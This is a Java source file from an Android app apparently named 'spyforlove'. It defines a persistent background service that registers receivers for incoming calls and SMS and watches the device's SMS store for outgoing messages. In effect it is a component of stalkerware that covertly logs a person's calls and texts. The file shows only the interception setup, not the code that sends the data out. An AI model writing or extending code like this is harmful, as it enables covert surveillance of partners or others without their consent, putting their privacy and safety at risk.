package chem.kth.spyforlove.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.Telephony;

import chem.kth.MainApplication;
import chem.kth.spyforlove.broadcast.CallReceiver;
import chem.kth.spyforlove.broadcast.MessageReceiver;
import chem.kth.spyforlove.broadcast.PhoneCallReceiver;

public class TrackMainService extends Service {

    public TrackMainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        this.getApplicationContext().startService(new Intent(this, InternetChecker.class));
        CallReceiver callReceiver = new CallReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.PHONE_STATE");
        this.registerReceiver(callReceiver, intentFilter);

        MessageReceiver messageReceiver = new MessageReceiver();
        IntentFilter messageFilter = new IntentFilter();
        messageFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        this.registerReceiver(messageReceiver, messageFilter);

        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
//      Uri.parse("content://sms/out")
//        creates and starts a new thread set up as a looper
        HandlerThread thread = new HandlerThread("MyHandlerThread");
        thread.start();

//      creates the handler using the passed looper
        Handler handler = new Handler(thread.getLooper());

        ContentResolver contentResolver = MainApplication.getContext().getContentResolver();
        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, new MessageSendObserver(handler));
    }
}